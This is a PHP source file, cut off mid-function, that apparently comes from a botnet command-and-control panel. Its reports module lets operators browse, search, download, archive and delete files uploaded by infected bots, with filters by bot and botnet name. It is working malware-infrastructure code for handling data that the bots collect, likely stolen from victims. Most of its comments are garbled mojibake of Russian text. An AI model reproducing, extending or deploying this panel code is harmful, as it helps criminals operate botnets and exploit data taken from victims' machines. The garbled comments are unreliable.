<?php if(!defined('__CP__'))die();
define('COLUMNS_COUNT', 4); //RљRѕR "Republic ‡ RμS, SЃRІRѕ RєRѕR" RѕRЅRѕRє RІ C, P ° P ± P "Res Rμ † C" P ° P № R "RѕRІ.

$_allow_remove = !empty($userData['r_reports_files_edit']);

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RћRїSЂRμRґRμR "SЏRμRј RґR ° RЅRЅS <Rμ RґR" SЏ with "Pepsi" SЊS, SЂR °.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

$_FILTER['path']    = isset($_GET['path']) ? $_GET['path'] : '';

$_FILTER['bots']    = isset($_GET['bots'])    ? $_GET['bots'] : '';
$_FILTER['botnets'] = isset($_GET['botnets']) ? $_GET['botnets'] : '';

$_FILTER['mask']    = isset($_GET['mask']) ? $_GET['mask'] : '';
$_FILTER['q']       = isset($_GET['q'])    ? $_GET['q'] : '';
$_FILTER['cs']      = empty($_GET['cs'])   ? 0 : 1;
//P 'C ‰ RμRєSѓS RμR number RїR ° RїRєRμ RјS <RјRѕR ¶ RμRј ReSЃRєR ° C SЊ C RѕR "SЊRєRѕ RєRѕRіRґR ° RЅRμ SѓRєR ° F ° F · RЅS <bots Re botnets.
$_FILTER['cd']      = (empty($_GET['cd']) || $_FILTER['bots'] != '' || $_FILTER['botnets'] != '')  ? 0 : 1;

$_is_browser = !isset($_GET['q']); //P RμR ¶ ReRј P ± SЂR ° SѓR · RμSЂR ° / ° RїRѕReSЃRєR

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RћR SЂR ° ± P ± P ° C, C <RІR ° RμRј $ _FILTER ['path'].
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
//P RґRμSЃSЊ RєRѕRЅRμS ‡ RЅRѕ RјS <RЅRμ P · P ° C ‰ ‰ Res RμRЅS <RѕS, RІRјRμS € P ° C RμR "SЊSЃRІR ° RІ http-P · P ° RїSЂRѕSЃ. RќRμS ... RІRјRμS € ReRІR ° C SЊSЃSЏ.

if(isset($_GET['sub']) && strlen($_GET['sub']) > 0)$_FILTER['path'] .= ($_FILTER['path'] == '' ? '' : '/').$_GET['sub'];
if(pathUpLevelExists($_FILTER['path']))die('WOW!');
$_CUR_PATH = $_FILTER['path'] == '' ? $config['reports_path'] : $config['reports_path'].'/'.$_FILTER['path'];

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// P-P ° RіSЂSѓR · RєR ° C "P ° P № P" P °.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

if(isset($_GET['file']))
{
  if(pathUpLevelExists($_GET['file']))die('SUPER WOW!');
  $fl = $_CUR_PATH.'/'.$_GET['file'];
  if(!@file_exists($fl) || !@is_file($fl))ThemeFatalError('File not exists.');
  
  httpDownloadHeaders(urldecode(baseNameEx($_GET['file'])), @filesize($fl));
  echo @file_get_contents($fl);
  die();
}

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RЎRѕR · RґR RЅReRμ ° F ° SЂS ... ReRІR ° / ° F RЈRґR "RμRЅReRμ C" P ° P № R "RѕRІ.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

if(isset($_POST['filesaction']) && is_numeric($_POST['filesaction']) && !empty($_POST['files']) && is_array($_POST['files']))
{
  foreach($_POST['files'] as $file)if(pathUpLevelExists($file))die('PUPER WOW!');
  
  //RЈRґR ° P "RμRЅReRμ C" P ° P № R "RѕRІ.
  if($_POST['filesaction'] == 0 && $_allow_remove)
  {
    $_errors = array();
    foreach($_POST['files'] as $file)if(strlen($file) > 0)ClearDF($_CUR_PATH.'/'.$file, $_errors);
  }
  //RЎRѕR · RґR RЅReRμ ° F ° SЂS ... ReRІR °.
  else if($_POST['filesaction'] == 1)
  {
    $list = array();
    foreach($_POST['files'] as $file)$list[] = $_CUR_PATH.'/'.$file;
    
    if(($arcfile = createTempFile('arc')) === false)die('Failed to create temp file.');
    @unlink($arcfile);
    
    require_once('fsarc.php');
    if(!function_exists('fsarcCreate') || ($arcfile = fsarcCreate($arcfile, $list)) === false)die('Failed to create archive, please check "system/fsarc.php" script.');
    
    httpDownloadHeaders(baseNameEx($arcfile), @filesize($arcfile));
    echo @file_get_contents($arcfile);
    @unlink($arcfile);
    die();
  }
}

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// R'S <RІRѕRґ.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

if(isset($_GET['search']))
{
  echo
  str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_NAME,  'auto'), THEME_LIST_HEADER_L).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_SIZE,  'auto'), THEME_LIST_HEADER_R).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_MTIME, 'auto'), THEME_LIST_HEADER_L).
    THEME_LIST_ROW_END;
  
  $ci = 0;
  $counter = array(0, 0, 0);
  $lastfolder = 0;
  
  if($_FILTER['bots'] != '' || $_FILTER['botnets'] != '')
  {
    //! RџSЂRe C, P ° RєRѕRј SЃRїRѕSЃRѕR ± Rμ RѕR ± R · RѕSЂR °, P ° P "RіRѕSЂReS, Rј RїRѕR" SѓS ‡ P ° RμS, SЃSЏ C SЂRμR ± RѕRІR ° C RμR "SЊRЅS <Rј Rє RїR ° RјSЏS , Fe, RЅRѕ RєR ° P ¶ RμS, SЊSЃSЏ SЃRєRѕR "RЅRμRЅ Rє P ± C <SЃS, SЂRѕRґRμR № C SЃS, RІReSЋ. R'SЂRμRјSЏ RїRѕRєR ° P ¶ RμS.
    
    //RџRѕR "SѓS ‡ P ° RμRј RєRѕSЂRЅRμRІS <Rμ RїR ° RїRєRe.
    $root = GetAllDirs($config['reports_path'], $ci);
    foreach($root as $rdir)
    {
      $tr = $config['reports_path'].'/'.$rdir;
      
      //RџRѕR "SѓS ‡ P ° P ± RμRј SЃRїReSЃRѕRє RѕS, RЅRμS, RѕRІ.
      $botnets = GetAllDirs($tr, $ci);
      foreach($botnets as $bn)if($_FILTER['botnets'] == '' || matchStringInExpression(urldecode($bn), $_FILTER['botnets'], 0, 1))
      {
        $tb = $tr.'/'.$bn;
        
        //RџRѕR "SѓS ‡ P ° P ± RμRј SЃRїReSЃRѕRє RѕS, RѕRІ.
        $bots = GetAllDirs($tb, $ci);
        foreach($bots as $b)if($_FILTER['bots'] == '' || matchStringInExpression(urldecode($b), $_FILTER['bots'], 0, 1))SearchDF($tb.'/'.$b, $rdir.'/'.$bn.'/'.$b, $ci, $counter, $lastfolder);
        unset($bots);
      }
      unset($botnets);
    }
    unset($root);
  }
  else
  {
    if($_FILTER['cd'])SearchDF($_CUR_PATH, $_FILTER['path'], $ci, $counter, $lastfolder);
    else SearchDF($config['reports_path'], '', $ci, $counter, $lastfolder);
  }
  
  echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'),
                   array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, numberFormatAsInt($counter[1]), numberFormatAsInt($counter[2]), numberFormatAsInt($counter[0]))),
                   THEME_LIST_TITLE).THEME_LIST_END; 
}
else
{
  define('INPUT_WIDTH',  '200px'); //REReSЂReRЅR ° input.text.
  define('INPUTQ_WIDTH', '500px'); //REReSЂReRЅR ° input.text.

  //RЎRѕR · RґR ° RμRј JS-SЃRєSЂReRїS.
  $fl_onsubmit  = ' onsubmit="return ExecuteAction()"';
  $js_qa     = addJsSlashes(LNG_REPORTS_FILESACTION_Q);
  $js_script = jsCheckAll('fileslist', 'checkall', 'files[]').
               "function ExecuteAction(){return confirm('{$js_qa}');}";

  if($_is_browser)
  {
    $query = addJsSlashes(QUERY_STRING.'&path='.urlencode($_FILTER['path']));
    $js_script .= jsSetSortMode($query);
  }
  else
  {
    $q = addJsSlashes(QUERY_STRING);
    foreach($_FILTER as $k => $v)$q .= addJsSlashes('&'.urlencode($k).'='.urlencode($v));
    
    $ajax_init = jsXmlHttpRequest('srhhttp');
    $ajax_err  = addJsSlashes(str_replace('{TEXT}', LNG_REPORTS_RESULT_ERROR, THEME_STRING_ERROR));
    
    $js_script .=
<<<JS_SCRIPT

var srhhttp = false;

function stateChange(){if(srhhttp.readyState == 4)
{
  var el = document.getElementById('result');
  if(srhhttp.status == 200 && srhhttp.responseText.length > 1)el.innerHTML = srhhttp.responseText;
  else el.innerHTML = '{$ajax_err}';
}}

function SearchFiles()
{
  {$ajax_init}
  if(srhhttp)
  {
    srhhttp.onreadystatechange = function(){stateChange()};
    srhhttp.open('GET', '{$q}&search=1', true);
    srhhttp.send(null);
  }
}
JS_SCRIPT;
  }  

  ThemeBegin(LNG_REPORTS, $js_script, $_is_browser ? 0 : getBotJsMenu('botmenu'), $_is_browser ? 0 : ' onload="SearchFiles(0, 0)"');
  
  //P ¤ Pepsi "SЊS, SЂ.
  echo 
  str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN).
    FORM_CURRENT_MODULE.
    str_replace(array('{NAME}', '{VALUE}'), array('path', htmlEntitiesEx($_FILTER['path'])), THEME_FORM_VALUE).
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
    
      //RЎS, P ° ° RЅRґR SЂS, RЅS <P № C "Pepsi" SЊS, SЂ.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlEntitiesEx($_FILTER['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlEntitiesEx($_FILTER['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //RЎS, SЂRѕRєR RїRѕReSЃRєR ° °.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_MASK, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'mask', htmlEntitiesEx($_FILTER['mask']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_QUERY, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'q', htmlEntitiesEx($_FILTER['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''), $_FILTER['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cd', 1, LNG_REPORTS_FILTER_CURDIR, ''), $_FILTER['cd'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //RЈRїSЂR ° RІR "RμRЅReRμ.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
        THEME_STRING_SPACE.
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      THEME_DIALOG_ACTIONLIST_END.
    THEME_DIALOG_END.
  THEME_FORMGET_END.
  THEME_VSPACE;

  //R'S <RІRѕRґ RѕS € Pepsi ± RѕRє.
  if(!empty($_errors))
  {
    $i = 0;
    echo str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN);
    foreach($_errors as $e)
    {
      echo
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', str_replace('{TEXT}', $e, THEME_STRING_ERROR)), ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1)).
      THEME_LIST_ROW_END;
      $i++;
    }
    echo THEME_LIST_END.THEME_VSPACE;
  }

  //RЎRїReSЃRѕRє RґRμR № C SЃRІReR №.
  $al = LNG_REPORTS_FILESACTION.THEME_STRING_SPACE.str_replace(array('{NAME}', '{WIDTH}'), array('filesaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
  if($_allow_remove)$al .= str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_REPORTS_FILESACTION_REMOVE), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  $al .= str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_REPORTS_FILESACTION_CREATEARC), THEME_DIALOG_ITEM_LISTBOX_ITEM).
         THEME_DIALOG_ITEM_LISTBOX_END.
         THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;

  //RћR ± R · RѕSЂ.
  if($_is_browser)
  {
    //RћRїSЂRμRґRμR "SЏRμRј RґR ° RЅRЅS <Rμ C RμRєSѓS ‰ RμR number SЃRѕSЂS, ReSЂRѕRІRєRe.
    $_uri_sortmode_html = htmlEntitiesEx(assocateSortMode(array(0, 1, 2)));
    
    echo
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($_FILTER['path'])).$_uri_sortmode_html, $fl_onsubmit), THEME_FORMPOST_BEGIN).
      str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT_BROWSE), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
            str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_LIST_DIR_TITLE.' '.htmlEntitiesEx('/'.urldecode($_FILTER['path']))), THEME_LIST_TITLE).
            THEME_LIST_ROW_BEGIN.
              str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
              writeSortColumn(LNG_REPORTS_LIST_NAME,  0, 0).
              writeSortColumn(LNG_REPORTS_LIST_SIZE,  1, 0).
              writeSortColumn(LNG_REPORTS_LIST_MTIME, 2, 1).
            THEME_LIST_ROW_END;  
    
    //RћRїSЂRμRґRμR "SЏRμRј URL'S <.
    $up = dirname($_FILTER['path']);
    if(strcmp($up, '.') === 0 || strcmp($up, '/') === 0 || strcmp($up, '\\') === 0)$up = '';
      
    $_url_download = QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($_FILTER['path'])).'&amp;file=';
    $_url_subdir   = QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($_FILTER['path'])).$_uri_sortmode_html.'&amp;sub=';
    $_url_updir    = QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($up)).$_uri_sortmode_html;
      
    //§ P Res, P ° RμRј RєR ° C, P ° P "RѕRі. Rљ SЃRѕR ¶ RμR "RμRЅReSЋ P ° P" RіRѕSЂReS, Rј RѕS ‡ RμRЅSЊ RјRμRґR "RμRЅRЅS <P № ...
    $files = array();
    $dirs  = array();
    $size  = 0;
    $msg   = '';
  
    if(($dr = @opendir($_CUR_PATH)) === false)$msg = LNG_REPORTS_RESULT_ERRORDIR;
    else
    {
      //§ P Res, P ° RμRј RєR ° C, P ° P "RѕRі.
      while(($fl = @readdir($dr)) !== false)if(strcmp($fl, '..') !== 0 && strcmp($fl, '.') !== 0)
      {
        $cur = $_CUR_PATH.'/'.$fl;
        if(($mtime = @filemtime($cur)) === false)$mtime = 0;
     
        if(is_dir($cur))$dirs[] = array($fl, 0, $mtime);
        else
        {
          if(($sz = @filesize($cur)) === false)$sz = 0;
          $size += $sz;
          $files[] = array($fl, $sz >= 0 ? $sz : -1, $mtime);
        }
      }
    
      @closedir($dr);
    
      usort($files, 'sort_proc');
      usort($dirs,  'sort_proc');
    }
  
    $c = 0;
      
    //P RѕR ± P ° RІR "SЏRμRј SѓSЂRѕRІRμRЅSЊ RІRІRμSЂS ....
    if($_FILTER['path'] != '')echo ListElement($c, 0, str_replace(array('{URL}', '{TEXT}'), array($_url_updir, htmlEntitiesEx('[..]')), THEME_LIST_ANCHOR), LNG_REPORTS_LIST_UP, @filemtime($_CUR_PATH));
      
    if($msg != '')                                             echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $msg), THEME_LIST_ITEM_EMPTY_1);
    else if(count($files) == 0 && count($dirs) == 0 && $c == 0)echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_RESULT_EMPTYDIR), THEME_LIST_ITEM_EMPTY_1);
    else
    {
      //R'S <RІRѕRґ RґReSЂRμRєS, RѕSЂReR №.
      foreach($dirs as $fl)
      {
        $a = str_replace(array('{URL}', '{TEXT}'), array($_url_subdir.htmlEntitiesEx(urlencode($fl[0])), htmlEntitiesEx('['.urldecode($fl[0]).']')), THEME_LIST_ANCHOR);
        echo ListElement($c, $fl[0], $a, LNG_REPORTS_LIST_DIR, $fl[2]);
      }

      //R'S <RІRѕRґ C "P ° P № R" RѕRІ.
      foreach($files as $fl)
      {
        $a = str_replace(array('{URL}', '{TEXT}'), array($_url_download.htmlEntitiesEx(urlencode($fl[0])), htmlEntitiesEx(urldecode($fl[0]))), THEME_LIST_ANCHOR);
        echo ListElement($c, $fl[0], $a, $fl[1], $fl[2]);
      }
      
      echo
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'),
                  array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, numberFormatAsInt(count($files)), numberFormatAsInt($size), numberFormatAsInt(count($dirs)))),
                  THEME_LIST_TITLE);
    }
    
    echo THEME_LIST_END.THEME_DIALOG_ITEM_CHILD_END.THEME_DIALOG_ROW_END.THEME_DIALOG_END.THEME_FORMPOST_END;
  }
  //P RμR · SѓR "SЊS, P ° C RїRѕReSЃRєR °.
  else
  {
    //P RμR · SѓR "SЊS, P ° C.
    echo
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML, $fl_onsubmit), THEME_FORMPOST_BEGIN).
      str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace('{ID}', 'result', THEME_STRING_ID_BEGIN).
              THEME_IMG_WAIT.
            THEME_STRING_ID_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_END.
    THEME_FORMPOST_END;
  }
  
  ThemeEnd();
}

die();


////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// P ¤ † SѓRЅRєS ReRe.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

/*
  Алгоритм сортровки по имени/размеру/дате.
  см. usort. 
*/
function sort_proc($a, $b)
{
  global $_sortOrder, $_sortColumnId;
  
  $r = 0;
  if($_sortColumnId == 0)     $r = strcasecmp($a[0], $b[0]);
  else if($_sortColumnId == 1)$r = ($a[1] > $b[1] ? 1 : ($a[1] < $b[1] ? -1 : 0)); //FIXME: RќRμRїSЂR ° RІReR "SЊRЅR ° SЏ SЃRѕSЂS, ReSЂRѕRІRєR ° RґR" SЏ C "P ° P № R" RѕRІ P ± RѕR "RμRμ 2P" P ±.
  else if($_sortColumnId == 2)$r = ($a[2] > $b[2] ? 1 : ($a[2] < $b[2] ? -1 : 0));
  
  if($r == 0 && $_sortColumnId != 0)$r = strcasecmp($a[0], $b[0]);
  
  return ($_sortOrder == 0 || $r == 0 ? $r : (-$r));
}

/*
  Удаление файлов и папок.
  
  IN $path         - string, полный путь.
  IN OUT $badfiles - array, список элементов, котрые не удалось удалить.
*/
function ClearDF($path, &$badfiles)
{
  @chmod($path, 0777);
  
  if(is_dir($path))
  {
    if(($dh = @opendir($path)) !== false)
    {
      while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)ClearDF($path.'/'.$file, $badfiles);
      @closedir($dh);
    }
    if(!@rmdir($path) && @file_exists($path))$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EDIR, htmlEntitiesEx($path));
  }
  else if(is_file($path))
  {
    if(!@unlink($path) && @file_exists($path))$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EFILE, htmlEntitiesEx($path));
  }
}

/*
  Поиск файлов и папок.
  
  IN $path           - string, полный путь в котором осушетвляется поиск.
  IN $upath          - string, путь отображаемый для пользователя.
  IN OUT $ci         - int, счетчик элемента.
  IN OUT $counter    - array, счетчики папок и файлов.
  IN OUT $lastfolder - string, последняя директория которая являлось родителем для найденого элемента.
*/
function SearchDF($path, $upath, &$ci, &$counter, &$lastfolder)
{
  global $_FILTER;

  if(($dh = @opendir($path)) === false)echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlEntitiesEx($path)), THEME_STRING_ERROR), -1, 0);
  else 
  {
    $subdirs = array(); 
    
    //P P ° P ± RѕS, P ° ° RμRј RЅR SЃRєRѕSЂRѕSЃS, SЊ. P • SЃS, SЊ RїRѕRІS, RѕSЂSЏSЋS ‰ ReRμSЃSЏ C SЂR ° RіRјRμRЅS, C <!
    while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)
    {
      $npath  = $path.'/'.$file;
      $nupath = ($upath == '' ? '' : $upath.'/').$file;
      
      if(is_dir($npath))
      {
        $subdirs[] = array($npath, $nupath);
        
        if($_FILTER['q'] == '' && matchStringInExpression(($rname = urldecode(($file))), $_FILTER['mask'], 0, 1))
        {
          if(strcasecmp($lastfolder, $upath) !== 0){$ci = 0; $lastfolder = $upath; TitleAsPathNavigator($upath);}
          $a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($upath)).'&amp;sub='.htmlEntitiesEx(urlencode($file)), htmlEntitiesEx('['.$rname.']')), THEME_LIST_ANCHOR);
          echo ListElement($ci, $nupath, $a, LNG_REPORTS_LIST_DIR, @filemtime($npath));
          $counter[0]++;
        }
      }
      else if(is_file($npath) && matchStringInExpression(($rname = urldecode($file)), $_FILTER['mask'], 0, 1) && ($_FILTER['q'] == '' || SearchString($_FILTER['q'], $_FILTER['cs'], $npath, $ci)))
      {
        if(strcasecmp($lastfolder, $upath) !== 0){$ci = 0; $lastfolder = $upath; TitleAsPathNavigator($upath);}
        $a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;path='.htmlEntitiesEx(urlencode($upath)).'&amp;file='.htmlEntitiesEx(urlencode($file)), htmlEntitiesEx($rname)), THEME_LIST_ANCHOR);
        
        echo ListElement($ci, $nupath, $a, ($sz = @filesize($npath)), @filemtime($npath));
        $counter[1] ++;
        $counter[2] += $sz;
      }
    }
      
    @closedir($dh);
    
    foreach($subdirs as $sd)SearchDF($sd[0], $sd[1], $ci, $counter, $lastfolder);
  }
}

/*
  Вывод THEME_LIST_TITLE с навигацией по папкам.
  
  IN $path - string, путь для обработки.
*/
function TitleAsPathNavigator($path)
{
  $_url_subdir = QUERY_STRING_HTML.'&amp;path=&amp;sub=';
  $str = '';
  $list = explode('/', str_replace('\\', '/', $path));
  $p = '';
  $i = 0;
  foreach($list as $k)
  {
    if($i++ == 2)$str .= '/'.botPopupMenu(urldecode($k), 'botmenu');
    else $str .= '/'.str_replace(array('{URL}', '{TEXT}'), array($_url_subdir.htmlEntitiesEx(urlencode($p.$k)), htmlEntitiesEx(urldecode($k))), THEME_LIST_ANCHOR);
    
    $p .= $k.'/';
  }
  
  echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $str == '' ? '/' : $str), THEME_LIST_TITLE);
}

/*
  Поиск utf-8 строки в файле.
  
  IN $str     - string, строка для поиска.
  IN $cs      - int, > 0 - поиск с учетом регистра.
  IN $file    - string, файл в котором производися поиск.
  IN OUT $ci  - int, счетчик элемента.
  
  Return      - true - строка найдена,
                false - строка не найдена.
*/
function SearchString($str, $cs, $file, &$ci)
{
  $len      = strlen($str);
  $len_b    = -($len - 1);
  $buf_size = max(1 * 1024 * 1024, $len);

  if(($f = @fopen($file, 'rb')) === false)
  {
    echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEFILE, htmlEntitiesEx($file)), THEME_STRING_ERROR), -1, 0);
    return false;
  }

  //P P ° P ± RѕS, P ° ° RμRј RЅR SЃRєRѕSЂRѕSЃS, SЊ.
  if($cs)
  {
    do if(@mb_strpos(@fread($f, $buf_size), $str) !== false)
    {
      @fclose($f);
      return true;
    }
    while(!@feof($f) && @fseek($f, $len_b, SEEK_CUR) === 0);
  }
  else
  {
    $str = @mb_strtolower($str);
    do if(@mb_strpos(@mb_strtolower(@fread($f, $buf_size)), $str) !== false)
    {
      @fclose($f);
      return true;
    }
    while(!@feof($f) && @fseek($f, $len_b, SEEK_CUR) === 0);
  }

  @fclose($f);
  return false;
}

/*
  Получение списка всех директорий.
  
  IN $path   - string, путь для поиска.
  IN OUT $ci - int, счетчик элемента.
  
  Return     - array, список диреторий.
*/
function GetAllDirs($path, &$ci)
{
  $r = getDirs($path);
  if($r === false)
  {
    echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlEntitiesEx($path)), THEME_STRING_ERROR), -1, 0);
    $r = array();
  }
  return $r;
}

/*  RЎRѕR · RґR ° RЅReRμ SЌR "RμRјRμRЅS, P ° RґR" SЏ SЃRїReSЃRѕRєR °.
  
  IN OUT $ ci - int, SЃS RμS ‡, C ‡ ReRє SЌR "RμRјRμRЅS, P °.
  IN $ pd_name - string, RґR ° RЅRЅS <Rμ RґR "SЏ POST ['files'] (P ± RμR · RѕR SЂR ° ± P ± RѕS, RєRe htmlEntitiesEx), Pepsi" Fe 0.
  IN $ text - C RμRєSЃS, SЌR "RμRјRμRЅS, P °.
  IN $ size - int / string, SЂR ° F · RјRμSЂ SЌR "RμRјRμRЅS, RІ P ° P ± P ° P № C, P ° C ... Pepsi" Pe -1, Pepsi "Re SЃS, SЂRѕRєR ° (SЃ RѕR ± SЂRѕR ± RѕS, RєRѕR № htmlEntitiesEx).
  IN $ mtime - int, RІSЂRμRјSЏ RјRѕRґReS "ReRєR ° C † ReRe SЌR" RμRјRμRЅS, P °, Pepsi "Fe 0.
  
  Retrurn - string, SЌR "RμRјRμRЅS.*/
function ListElement(&$ci, $pd_name, $text, $size, $mtime)
{
  $theme = $ci % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1;
  $ci++;
  
  return
  THEME_LIST_ROW_BEGIN.
    (
